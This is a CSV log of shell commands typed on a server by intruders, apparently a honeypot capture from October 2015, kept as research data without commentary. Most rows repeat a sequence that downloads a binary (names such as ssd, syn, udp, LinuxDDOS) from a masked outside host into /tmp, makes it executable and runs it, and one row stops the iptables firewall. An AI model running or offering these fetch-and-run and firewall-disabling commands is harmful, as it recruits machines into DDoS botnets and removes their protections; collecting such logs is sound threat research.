ip,timestamp,input
"222.186.34.75","2015-10-20 23:15:02","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 23:15:33","cd /tmp"
"222.186.34.75","2015-10-20 23:15:33","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 23:15:33","./ssd"
"222.186.34.75","2015-10-20 23:15:33","exit"
"222.186.34.75","2015-10-20 23:15:34","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 23:15:37","cd /tmp"
"222.186.34.75","2015-10-20 23:15:41","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 23:15:45","./ssd"
"222.186.34.75","2015-10-20 23:15:49","exit"
"222.186.34.75","2015-10-20 23:17:24","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 23:17:28","cd /tmp"
"222.186.34.75","2015-10-20 23:17:32","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 23:17:36","./ssd"
"222.186.34.75","2015-10-20 23:17:40","exit"
"222.186.34.75","2015-10-20 23:40:34","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 23:40:38","cd /tmp"
"222.186.34.75","2015-10-20 23:40:42","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 23:40:46","./ssd"
"222.186.34.75","2015-10-20 23:40:50","exit"
"222.186.34.75","2015-10-20 23:48:38","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-20 23:48:42","cd /tmp"
"222.186.34.75","2015-10-20 23:48:46","chmod 777 ./ssd"
"222.186.34.75","2015-10-20 23:48:50","./ssd"
"222.186.34.75","2015-10-20 23:48:54","exit"
"222.186.34.75","2015-10-21 00:29:23","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 00:29:27","cd /tmp"
"222.186.34.75","2015-10-21 00:29:31","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 00:29:35","./ssd"
"222.186.34.75","2015-10-21 00:29:39","exit"
"222.186.34.75","2015-10-21 00:44:20","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 00:44:36","cd /tmp"
"222.186.34.75","2015-10-21 00:44:36","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 00:44:36","./ssd"
"222.186.34.75","2015-10-21 00:44:36","exit"
"222.186.34.75","2015-10-21 00:44:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 00:44:40","cd /tmp"
"222.186.34.75","2015-10-21 00:44:44","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 00:44:48","./ssd"
"222.186.34.75","2015-10-21 00:44:52","exit"
"222.186.34.75","2015-10-21 00:47:52","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 00:47:56","cd /tmp"
"222.186.34.75","2015-10-21 00:48:00","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 00:48:04","./ssd"
"222.186.34.75","2015-10-21 00:48:08","exit"
"222.186.34.75","2015-10-21 01:08:25","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 01:08:29","cd /tmp"
"222.186.34.75","2015-10-21 01:08:33","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 01:08:37","./ssd"
"222.186.34.75","2015-10-21 01:08:41","exit"
"222.186.34.75","2015-10-21 01:12:10","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 01:12:14","cd /tmp"
"222.186.34.75","2015-10-21 01:12:18","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 01:12:22","./ssd"
"222.186.34.75","2015-10-21 01:12:26","exit"
"222.186.34.75","2015-10-21 01:27:09","free -m"
"222.186.34.75","2015-10-21 01:28:52","free -m"
"222.186.34.75","2015-10-21 03:27:22","free -m"
"222.186.34.75","2015-10-21 03:39:04","wget -O /tmp/LinuxDDOS http://***.***.***.***/LinuxDDOS"
"222.186.34.75","2015-10-21 20:24:54","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-21 20:24:58","cd /tmp"
"222.186.34.75","2015-10-21 20:25:02","chmod 777 ./ssd"
"222.186.34.75","2015-10-21 20:25:06","./ssd"
"222.186.34.75","2015-10-21 20:25:10","exit"
"180.20.11.247","2015-10-22 01:06:05","echo -n test"
"180.20.11.247","2015-10-22 01:08:51","echo -n test"
"75.98.151.42","2015-10-22 01:37:16","echo -n test"
"182.73.212.238","2015-10-22 01:37:40","echo -n test"
"75.98.151.42","2015-10-22 01:39:16","echo -n test"
"27.34.25.226","2015-10-22 01:40:59","echo -n test"
"177.126.220.17","2015-10-22 08:23:04","echo -n test"
"177.126.220.17","2015-10-22 08:27:02","echo -n test"
"103.48.66.37","2015-10-22 08:58:04","echo -n test"
"103.48.66.37","2015-10-22 08:58:49","echo -n test"
"222.186.34.75","2015-10-23 02:19:02","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 02:19:06","cd /tmp"
"222.186.34.75","2015-10-23 02:19:10","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 02:19:14","./ssd"
"222.186.34.75","2015-10-23 02:19:18","exit"
"115.144.166.31","2015-10-23 04:48:31","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-23 04:48:34","cd /tmp"
"115.144.166.31","2015-10-23 04:48:39","chmod 0775 ./ssd"
"115.144.166.31","2015-10-23 04:48:44","./ssd"
"115.144.166.31","2015-10-23 05:35:09","wget -O /tmp/syn http://***.***.***.***/syn"
"115.144.166.31","2015-10-23 05:35:13","cd /tmp"
"115.144.166.31","2015-10-23 05:35:17","chmod 777 ./syn"
"115.144.166.31","2015-10-23 05:35:22","./syn"
"222.186.34.75","2015-10-23 06:02:52","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-23 06:02:56","cd /tmp"
"222.186.34.75","2015-10-23 06:03:00","chmod 777 ./syn"
"222.186.34.75","2015-10-23 06:03:04","./syn"
"222.186.34.75","2015-10-23 06:14:13","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-23 06:14:17","cd /tmp"
"222.186.34.75","2015-10-23 06:14:21","chmod 777 ./syn"
"222.186.34.75","2015-10-23 06:14:25","./syn"
"222.186.34.75","2015-10-23 06:19:22","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-23 06:19:26","cd /tmp"
"222.186.34.75","2015-10-23 06:19:30","chmod 777 ./syn"
"222.186.34.75","2015-10-23 06:19:34","./syn"
"222.186.34.75","2015-10-23 06:27:35","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-23 06:27:39","cd /tmp"
"222.186.34.75","2015-10-23 06:27:43","chmod 777 ./syn"
"222.186.34.75","2015-10-23 06:27:47","./syn"
"115.144.166.31","2015-10-23 06:58:22","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-23 06:58:26","cd /tmp"
"115.144.166.31","2015-10-23 06:58:30","chmod 777 ./ssd"
"115.144.166.31","2015-10-23 06:58:36","./ssd"
"115.144.166.31","2015-10-23 07:03:31","wget -O /tmp/ssd http://***.***.***.***/ssd"
"115.144.166.31","2015-10-23 07:03:34","cd /tmp"
"115.144.166.31","2015-10-23 07:03:39","chmod 777 ./ssd"
"115.144.166.31","2015-10-23 07:03:43","./ssd"
"222.186.34.75","2015-10-23 07:43:33","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-23 07:43:37","cd /tmp"
"222.186.34.75","2015-10-23 07:43:41","chmod 777 ./syn"
"222.186.34.75","2015-10-23 07:43:45","./syn"
"115.144.166.31","2015-10-23 09:17:06","wget -O /tmp/syn http://***.***.***.***/syn"
"115.144.166.31","2015-10-23 09:17:11","cd /tmp"
"115.144.166.31","2015-10-23 09:17:15","chmod 777 ./syn"
"115.144.166.31","2015-10-23 09:17:19","./syn"
"222.186.34.75","2015-10-23 11:00:53","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:00:58","cd /tmp"
"222.186.34.75","2015-10-23 11:01:01","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:01:05","./ssd"
"222.186.34.75","2015-10-23 11:04:30","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:04:33","cd /tmp"
"222.186.34.75","2015-10-23 11:04:38","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:04:41","./ssd"
"222.186.34.75","2015-10-23 11:05:34","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:05:38","cd /tmp"
"222.186.34.75","2015-10-23 11:05:42","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:05:46","./ssd"
"222.186.34.75","2015-10-23 11:27:22","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:27:42","cd /tmp"
"222.186.34.75","2015-10-23 11:27:42","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:27:42","./ssd"
"222.186.34.75","2015-10-23 11:27:42","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:27:46","cd /tmp"
"222.186.34.75","2015-10-23 11:28:02","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:28:02","./ssd"
"222.186.34.75","2015-10-23 11:28:02","exit"
"222.186.34.75","2015-10-23 11:28:03","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:28:06","cd /tmp"
"222.186.34.75","2015-10-23 11:28:10","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:28:25","./ssd"
"222.186.34.75","2015-10-23 11:28:25","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:28:29","cd /tmp"
"222.186.34.75","2015-10-23 11:28:33","chmod 777 ./ssd"
"222.186.34.75","2015-10-23 11:28:37","./ssd"
"222.186.34.75","2015-10-23 11:57:32","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:57:51","cd /tmp"
"222.186.34.75","2015-10-23 11:57:52","chmod 0755 ./ssd"
"222.186.34.75","2015-10-23 11:57:52","./ssd"
"222.186.34.75","2015-10-23 11:57:52","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 11:57:56","cd /tmp"
"222.186.34.75","2015-10-23 11:58:00","chmod 0755 ./ssd"
"222.186.34.75","2015-10-23 11:58:04","./ssd"
"222.186.34.75","2015-10-23 12:22:08","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 12:22:12","cd /tmp"
"222.186.34.75","2015-10-23 12:22:16","chmod 0755 ./ssd"
"222.186.34.75","2015-10-23 12:22:20","./ssd"
"222.186.34.75","2015-10-23 12:27:02","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 12:27:06","cd /tmp"
"222.186.34.75","2015-10-23 12:27:10","chmod 0755 ./ssd"
"222.186.34.75","2015-10-23 12:27:14","./ssd"
"222.186.34.75","2015-10-23 12:35:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-23 12:36:01","cd /tmp"
"222.186.34.75","2015-10-23 12:36:05","chmod 0755 ./ssd"
"222.186.34.75","2015-10-23 12:36:09","./ssd"
"101.108.178.53","2015-10-23 14:18:58","echo -n test"
"101.108.178.53","2015-10-23 14:22:08","echo -n test"
"125.88.181.55","2015-10-23 17:52:26","wget http://***.***.***.***/5ca.zip"
"125.88.181.55","2015-10-23 17:52:29","chmod 777 5ca.zip"
"125.88.181.55","2015-10-23 17:52:33","./5ca.zip &"
"187.84.95.245","2015-10-23 18:49:37","echo -n test"
"187.84.95.245","2015-10-23 18:52:51","echo -n test"
"186.249.104.216","2015-10-23 20:50:05","echo -n test"
"186.249.104.216","2015-10-23 20:53:20","echo -n test"
"59.56.110.233","2015-10-24 02:02:24","/etc/init.d/iptables stop"
"59.56.110.233","2015-10-24 02:02:28","wget http://***.***.***.***/ScanA.rar"
"59.56.110.233","2015-10-24 02:02:40","wget http://***.***.***.***/ScanB.zip"
"59.56.110.233","2015-10-24 02:02:52","wget http://***.***.***.***/winsyn.zip"
"59.56.110.233","2015-10-24 02:03:00","chmod u+x winsyn.zip"
"59.56.110.233","2015-10-24 02:03:04","/root/winsyn.zip"
"59.56.110.233","2015-10-24 02:03:08","./winsyn.zip &"
"222.186.34.75","2015-10-24 02:09:25","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-24 02:09:29","cd /tmp"
"222.186.34.75","2015-10-24 02:09:33","chmod 0755 ./ssd"
"222.186.34.75","2015-10-24 02:09:37","./ssd"
"222.186.34.75","2015-10-24 02:30:21","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-24 02:30:25","cd /tmp"
"222.186.34.75","2015-10-24 02:30:29","chmod 777 ./ssd"
"222.186.34.75","2015-10-24 02:30:33","./ssd"
"222.186.34.75","2015-10-24 02:57:55","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-24 02:58:13","cd /tmp"
"222.186.34.75","2015-10-24 02:58:13","chmod 0755 ./syn"
"222.186.34.75","2015-10-24 02:58:13","./syn"
"222.186.34.75","2015-10-24 02:58:14","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-24 02:58:17","cd /tmp"
"222.186.34.75","2015-10-24 02:58:21","chmod 0755 ./syn"
"222.186.34.75","2015-10-24 02:58:25","./syn"
"222.186.34.75","2015-10-24 03:24:52","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-24 03:24:56","cd /tmp"
"222.186.34.75","2015-10-24 03:25:00","chmod 777 ./syn"
"222.186.34.75","2015-10-24 03:25:04","./syn"
"222.186.34.75","2015-10-24 03:26:18","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-24 03:26:21","cd /tmp"
"222.186.34.75","2015-10-24 03:26:26","chmod 777 ./syn"
"222.186.34.75","2015-10-24 03:26:29","./syn"
"185.110.247.88","2015-10-24 06:28:23","echo -n test"
"185.110.247.88","2015-10-24 06:32:22","echo -n test"
"222.186.15.16","2015-10-24 12:33:24","wget http://***.***.***.***/5caa1.zip"
"222.186.15.16","2015-10-24 12:33:28","chmod 777 5caa1.zip"
"222.186.15.16","2015-10-24 12:33:32","./5caa1.zip &"
"122.149.94.63","2015-10-24 16:38:28","echo -n test"
"122.149.94.63","2015-10-24 16:40:32","echo -n test"
"179.106.74.109","2015-10-24 17:18:40","echo -n test"
"179.106.74.109","2015-10-24 17:22:08","echo -n test"
"37.237.112.69","2015-10-24 17:39:24","echo -n test"
"37.237.112.69","2015-10-24 17:42:48","echo -n test"
"183.238.58.234","2015-10-24 19:24:31","echo -n test"
"183.238.58.234","2015-10-24 19:27:41","echo -n test"
"222.186.34.75","2015-10-26 05:39:49","free -m"
"222.186.34.75","2015-10-26 06:01:16","free -m"
"222.186.34.75","2015-10-26 06:08:28","free -m"
"222.186.34.75","2015-10-26 06:28:53","free -m"
"222.186.34.75","2015-10-26 06:45:36","free -m"
"222.186.34.75","2015-10-26 07:33:43","free -m"
"222.186.34.75","2015-10-26 07:37:58","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:38:01","cd /tmp"
"222.186.34.75","2015-10-26 07:38:06","chmod 0755 ./syn"
"222.186.34.75","2015-10-26 07:38:20","./syn"
"222.186.34.75","2015-10-26 07:38:21","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:38:38","cd /tmp"
"222.186.34.75","2015-10-26 07:38:38","chmod 0755 ./syn"
"222.186.34.75","2015-10-26 07:38:38","./syn"
"222.186.34.75","2015-10-26 07:38:39","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:39:09","cd /tmp"
"222.186.34.75","2015-10-26 07:39:09","chmod 0755 ./syn"
"222.186.34.75","2015-10-26 07:39:09","./syn"
"222.186.34.75","2015-10-26 07:47:47","free -m"
"222.186.34.75","2015-10-26 07:49:07","free -m"
"222.186.34.75","2015-10-26 07:58:06","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:58:23","cd /tmp"
"222.186.34.75","2015-10-26 07:58:23","chmod 777 ./syn"
"222.186.34.75","2015-10-26 07:58:23","./syn"
"222.186.34.75","2015-10-26 07:58:24","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:58:40","cd /tmp"
"222.186.34.75","2015-10-26 07:58:40","chmod 777 ./syn"
"222.186.34.75","2015-10-26 07:58:40","./syn"
"222.186.34.75","2015-10-26 07:58:40","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:58:56","cd /tmp"
"222.186.34.75","2015-10-26 07:58:56","chmod 777 ./syn"
"222.186.34.75","2015-10-26 07:58:56","./syn"
"222.186.34.75","2015-10-26 07:58:57","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:59:13","cd /tmp"
"222.186.34.75","2015-10-26 07:59:13","chmod 777 ./syn"
"222.186.34.75","2015-10-26 07:59:13","./syn"
"222.186.34.75","2015-10-26 07:59:14","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 07:59:18","cd /tmp"
"222.186.34.75","2015-10-26 07:59:22","chmod 777 ./syn"
"222.186.34.75","2015-10-26 07:59:26","./syn"
"222.186.34.75","2015-10-26 08:07:40","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 08:07:58","cd /tmp"
"222.186.34.75","2015-10-26 08:07:58","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 08:07:58","./ssd"
"222.186.34.75","2015-10-26 08:07:59","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 08:08:31","cd /tmp"
"222.186.34.75","2015-10-26 08:08:31","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 08:08:31","./ssd"
"222.186.34.75","2015-10-26 08:10:10","free -m"
"222.186.34.75","2015-10-26 08:12:48","free -m"
"222.186.34.75","2015-10-26 08:19:53","wget -O /tmp/xudp http://***.***.***.***/xudp"
"222.186.34.75","2015-10-26 08:20:01","chmod 777 ./xudp"
"222.186.34.75","2015-10-26 08:20:05","./xudp"
"222.186.34.75","2015-10-26 08:28:14","free -m"
"222.186.34.75","2015-10-26 08:46:05","cd /tmp"
"222.186.34.75","2015-10-26 08:46:38","chmod 0755 ./xudp"
"222.186.34.75","2015-10-26 08:46:39","./xudp"
"222.186.34.75","2015-10-26 08:48:20","cd /tmp"
"222.186.34.75","2015-10-26 08:48:24","chmod 0755 ./xudp"
"222.186.34.75","2015-10-26 08:48:28","./xudp"
"222.186.34.75","2015-10-26 09:11:15","cd /tmp"
"222.186.34.75","2015-10-26 09:11:20","chmod 0755 ./xudp"
"222.186.34.75","2015-10-26 09:11:23","./xudp"
"222.186.34.75","2015-10-26 09:31:25","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:31:57","cd /tmp"
"222.186.34.75","2015-10-26 09:31:57","chmod 0775 ./ssd"
"222.186.34.75","2015-10-26 09:31:58","./ssd"
"222.186.34.75","2015-10-26 09:31:58","exit"
"222.186.34.75","2015-10-26 09:34:44","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:34:47","cd /tmp"
"222.186.34.75","2015-10-26 09:34:51","chmod 0775 ./ssd"
"222.186.34.75","2015-10-26 09:34:55","./ssd"
"222.186.34.75","2015-10-26 09:34:59","exit"
"222.186.34.75","2015-10-26 09:41:06","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:41:38","cd /tmp"
"222.186.34.75","2015-10-26 09:41:38","chmod 0775 ./ssd"
"222.186.34.75","2015-10-26 09:41:38","./ssd"
"222.186.34.75","2015-10-26 09:41:38","exit"
"222.186.34.75","2015-10-26 09:53:51","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:53:51","cd /tmp"
"222.186.34.75","2015-10-26 09:53:51","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 09:53:51","./ssd"
"222.186.34.75","2015-10-26 09:54:21","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:54:21","cd /tmp"
"222.186.34.75","2015-10-26 09:54:21","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 09:54:21","./ssd"
"222.186.34.75","2015-10-26 09:54:22","exit"
"222.186.34.75","2015-10-26 09:54:22","exit"
"222.186.34.75","2015-10-26 09:54:40","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:54:57","cd /tmp"
"222.186.34.75","2015-10-26 09:54:57","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 09:54:57","./ssd"
"222.186.34.75","2015-10-26 09:54:57","exit"
"222.186.34.75","2015-10-26 09:54:58","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 09:55:01","cd /tmp"
"222.186.34.75","2015-10-26 09:55:05","chmod 777 ./ssd"
"222.186.34.75","2015-10-26 09:55:09","./ssd"
"222.186.34.75","2015-10-26 09:55:14","exit"
"222.186.34.75","2015-10-26 10:23:05","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 10:23:51","cd /tmp"
"222.186.34.75","2015-10-26 10:23:52","chmod 777 ./syn"
"222.186.34.75","2015-10-26 10:23:52","./syn"
"222.186.34.75","2015-10-26 10:23:52","exit"
"222.186.34.75","2015-10-26 10:24:15","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 10:24:19","cd /tmp"
"222.186.34.75","2015-10-26 10:24:23","chmod 777 ./syn"
"222.186.34.75","2015-10-26 10:24:27","./syn"
"222.186.34.75","2015-10-26 10:24:31","exit"
"222.186.34.75","2015-10-26 10:36:03","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 10:36:07","cd /tmp"
"222.186.34.75","2015-10-26 10:36:11","chmod 777 ./syn"
"222.186.34.75","2015-10-26 10:36:15","./syn"
"222.186.34.75","2015-10-26 10:36:19","exit"
"222.186.34.75","2015-10-26 10:38:08","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 10:38:54","cd /tmp"
"222.186.34.75","2015-10-26 10:38:54","chmod 0755 ./syn"
"222.186.34.75","2015-10-26 10:38:54","./syn"
"222.186.34.75","2015-10-26 10:38:54","exit"
"222.186.34.75","2015-10-26 10:39:13","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-26 10:39:17","cd /tmp"
"222.186.34.75","2015-10-26 10:39:21","chmod 0755 ./syn"
"222.186.34.75","2015-10-26 10:39:25","./syn"
"222.186.34.75","2015-10-26 10:39:29","exit"
"222.186.34.75","2015-10-26 11:00:08","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 11:00:11","cd /tmp"
"222.186.34.75","2015-10-26 11:00:15","chmod 777 ./udp"
"222.186.34.75","2015-10-26 11:00:19","./udp"
"222.186.34.75","2015-10-26 11:00:23","exit"
"222.186.34.75","2015-10-26 11:15:03","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 11:15:38","cd /tmp"
"222.186.34.75","2015-10-26 11:15:38","chmod 777 ./udp"
"222.186.34.75","2015-10-26 11:15:38","./udp"
"222.186.34.75","2015-10-26 11:15:38","exit"
"222.186.34.75","2015-10-26 11:19:35","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 11:19:39","cd /tmp"
"222.186.34.75","2015-10-26 11:19:43","chmod 777 ./udp"
"222.186.34.75","2015-10-26 11:19:47","./udp"
"222.186.34.75","2015-10-26 11:19:51","exit"
"222.186.34.75","2015-10-26 11:58:56","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 11:59:00","cd /tmp"
"222.186.34.75","2015-10-26 11:59:04","chmod 777 ./udp"
"222.186.34.75","2015-10-26 11:59:07","./udp"
"222.186.34.75","2015-10-26 11:59:11","exit"
"222.186.34.75","2015-10-26 12:25:34","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 12:26:08","cd /tmp"
"222.186.34.75","2015-10-26 12:26:08","chmod 0755 ./ssd"
"222.186.34.75","2015-10-26 12:26:08","./ssd"
"222.186.34.75","2015-10-26 12:26:08","exit"
"222.186.34.75","2015-10-26 12:56:56","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 12:56:59","cd /tmp"
"222.186.34.75","2015-10-26 12:57:03","chmod 0755 ./ssd"
"222.186.34.75","2015-10-26 12:57:07","./ssd"
"222.186.34.75","2015-10-26 12:57:11","exit"
"222.186.34.75","2015-10-26 13:03:29","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-26 13:03:32","cd /tmp"
